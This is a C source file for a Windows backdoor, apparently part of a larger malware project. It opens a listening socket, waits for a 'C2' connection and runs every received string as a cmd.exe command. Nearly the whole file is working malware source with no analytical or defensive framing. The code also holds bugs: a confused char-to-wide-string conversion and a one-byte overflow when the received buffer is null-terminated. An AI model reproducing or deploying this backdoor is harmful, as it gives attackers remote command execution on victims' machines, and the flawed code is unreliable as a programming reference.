#include "../include/config.h"

BOOL StartBackdoor(void) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in address = {0};
    int opt = 1;

    printf("[DEBUG] StartBackdoor: Creating socket...\n");
    fflush(stdout);

    if (s == INVALID_SOCKET) {
        printf("[DEBUG] socket() failed: %lu\n", (unsigned long)s);
        printf("[BACKDOOR] Failed to create socket.\n");
        fflush(stdout);
        return FALSE;
    }
    printf("[DEBUG] Socket created: %lu\n", (unsigned long)s);
    fflush(stdout);

    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(int)) != 0) {
        printf("[DEBUG] setsockopt failed: %lu\n", (unsigned long)GetLastError());
    }

    address.sin_family = AF_INET;
    
    if (inet_pton(AF_INET, BACKDOOR_HOST, &address.sin_addr) == 1) {
        address.sin_port = htons(BACKDOOR_PORT);
        printf("[DEBUG] inet_pton succeeded\n");
        fflush(stdout);
    } else {
        printf("[DEBUG] inet_pton failed, fallback to inet_addr...\n");
        fflush(stdout);
        address.sin_addr.s_addr = inet_addr(BACKDOOR_HOST);
    }

    if (bind(s, (struct sockaddr*)&address, sizeof(address)) != SOCKET_ERROR) {
        printf("[DEBUG] bind() succeeded\n");
        fflush(stdout);
    } else {
        printf("[DEBUG] bind() failed: %lu\n", (unsigned long)GetLastError());
        fflush(stdout);
    }

    if (listen(s, SOCKET_BACKLOG) != SOCKET_ERROR) {
        printf("[DEBUG] listen() succeeded\n");
        fflush(stdout);
        
        // Show we're listening
        char hostip[16];
        inet_ntop(AF_INET, &address.sin_addr, hostip, sizeof(hostip) - 1);
        printf("[BACKDOOR] Listener ready on %s:%d\n", hostip, BACKDOOR_PORT);
        printf("[BACKDOOR] Waiting for C2 connection...\n");
        fflush(stdout);
        Sleep(2000);

        // Accept connection
        SOCKET client = accept(s, NULL, NULL);
        if (client != INVALID_SOCKET) {
            printf("[BACKDOOR] C2 Connected! Executing reverse shell...\n");
            fflush(stdout);

            // Spawn SYSTEM CMD.EXE for reverse shell (using wchar_t* consistently)
            wchar_t *cmdLine = NULL;
            
            // Create wide string command
            cmdLine = (wchar_t*)malloc(512 * sizeof(wchar_t));
            if (cmdLine) {
                swprintf(cmdLine, 512, L"cmd.exe /c start \"SystemShell\" cmd.exe /c whoami");
            }

            STARTUPINFOW_CUSTOM si = { 0 };
            PROCESS_INFORMATION pi = { 0 };
            
            si.dwSize = sizeof(STARTUPINFOW_CUSTOM);
            si.dwXStartInfo = 0x12345678;

            // Use wide strings for CreateProcessW
            if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, 
                               CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                               NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
                printf("[BACKDOOR] SYSTEM Shell spawned! PID=%lu\n", pi.dwProcessId);
                fflush(stdout);
                Sleep(5000);
                CloseHandle(pi.hThread);
            } else {
                printf("[BACKDOOR] Shell spawn failed: %lu\n", (unsigned long)GetLastError());
                fflush(stdout);
            }

            if (cmdLine) {
                free(cmdLine);
            }

            // Keep listening for commands
            printf("[BACKDOOR] Listening for C2 commands...\n");
            fflush(stdout);
            
            while (TRUE) {
                // Use char* for recv() (single-byte string)
                char *buffer = (char*)malloc(1024 * sizeof(char));
                if (buffer) {
                    int bytes = recv(client, buffer, 1024, 0);
                    if (bytes > 0) {
                        buffer[bytes] = 0;
                        printf("[BACKDOOR] Received: %s\n", buffer);
                        fflush(stdout);
                        
                        // Convert char* to wchar_t* for CreateProcessW
                        wchar_t *wcharBuffer = (wchar_t*)malloc(1024 * sizeof(wchar_t));
                        if (wcharBuffer) {
                            // Use wcstombs() to convert char* to wchar_t*
                            mbtowc(&wcharBuffer[0], buffer, 1);  // First char
                            
                            // Or use swprintf() directly with char* converted to wchar_t*
                            swprintf(wcharBuffer, 1024, L"%s", buffer);
                            
                            // Spawn SYSTEM CMD.EXE for each command (wide string)
                            wchar_t *cmdLine2 = (wchar_t*)malloc(2048 * sizeof(wchar_t));
                            if (cmdLine2 && wcharBuffer[0]) {
                                swprintf(cmdLine2, 2048, L"cmd.exe /c %ls", wcharBuffer);
                                
                                STARTUPINFOW_CUSTOM si2 = { 0 };
                                PROCESS_INFORMATION pi2 = { 0 };
                                si2.dwSize = sizeof(STARTUPINFOW_CUSTOM);
                                si2.dwXStartInfo = 0x12345679;
                                
                                if (CreateProcessW(NULL, cmdLine2, NULL, NULL, FALSE, 
                                                  CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                                                  NULL, NULL, (LPSTARTUPINFOW)&si2, &pi2)) {
                                    printf("[BACKDOOR] Command executed: PID=%lu\n", pi2.dwProcessId);
                                    fflush(stdout);
                                    Sleep(2000);
                                    CloseHandle(pi2.hThread);
                                } else {
                                    printf("[BACKDOOR] Command failed: %lu\n", (unsigned long)GetLastError());
                                    fflush(stdout);
                                }
                                free(cmdLine2);
                            }
                            free(wcharBuffer);
                        }
                        free(buffer);
                    } else if (bytes == 0) {
                        printf("[BACKDOOR] C2 Disconnected.\n");
                        fflush(stdout);
                        break;
                    } else {
                        printf("[BACKDOOR] Receive error: %lu\n", (unsigned long)GetLastError());
                        fflush(stdout);
                        break;
                    }
                } else {
                    printf("[BACKDOOR] Buffer allocation failed\n");
                    fflush(stdout);
                    break;
                }
            }

            closesocket(client);
        } else {
            printf("[DEBUG] accept() failed: %lu\n", (unsigned long)GetLastError());
            fflush(stdout);
        }
        closesocket(s);
        printf("[DEBUG] Listening socket closed\n");
        fflush(stdout);
        return TRUE;
    } else {
        printf("[DEBUG] listen() failed: %lu\n", (unsigned long)GetLastError());
        closesocket(s);
        printf("[BACKDOOR] Failed to bind/listen.\n");
        fflush(stdout);
        return FALSE;
    }
}
